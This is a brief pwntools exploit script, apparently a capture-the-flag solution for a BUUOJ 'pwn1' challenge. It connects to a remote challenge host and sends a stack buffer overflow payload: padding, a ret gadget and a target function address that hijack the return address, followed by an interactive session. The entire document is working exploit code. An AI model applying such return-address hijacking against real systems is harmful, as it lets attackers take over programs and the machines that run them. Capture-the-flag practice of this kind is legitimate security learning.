from pwn import *

context.arch = 'amd64'

# p = process('./pwn1')
p = remote('node3.buuoj.cn',28245)

payload = 'a'*(0xf+0x8)	# padding
payload += p64(0x401016) + p64(0x401186)	# retn to function of fun,ret = 0x401016

p.send(payload)
p.interactive()
